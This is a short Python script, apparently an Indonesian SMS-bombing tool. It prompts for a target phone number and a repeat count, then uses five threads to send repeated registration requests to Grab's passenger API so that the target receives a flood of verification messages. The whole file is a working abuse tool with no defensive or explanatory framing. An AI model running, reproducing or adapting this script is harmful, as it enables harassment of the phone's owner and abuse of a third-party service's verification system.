from multiprocessing.pool import ThreadPool

try:
        import os, random
        from time import sleep as turu
        import subprocess as sp
        import requests

except ModuleNotFoundError:
        print("\n\033[0m[\033[1;31m!\033[0m] \033[1;77mSepertinya modul requests belum terinstall\n")
        exit(1)
try:
        no = input("\033[0m[\033[1;32m+\033[0m] \033[1;77mMasukan Nomor Target: \033[0m")
        jum = int(input("\033[0m[\033[1;35m?\033[0m] \033[1;77mJumlah: \033[0m"))

except KeyboardInterrupt:
        print("\n\033[0m[\033[1;31m!\033[0m] \033[1;77mKKunci tidak sesuai\n")
        exit(1)
print
print("\033[0m[\033[1;33m*\033[0m] \033[1;77mMengulangi")
def main(arg):
        try:
                idk=('phoneNumber')
                r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                if str(idk) in str(r.text):
                        print("\033[0m[\033[1;36m&\033[0m] \033[1;77mBerhasil")
                else:
                        print("\033[0m[\033[1;31m!\033[0m] \033[1;77mGagal")
        except: pass
 
jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("\033[0m[\033[1;34m#\033[0m] \033[1;77mSelesai\n")
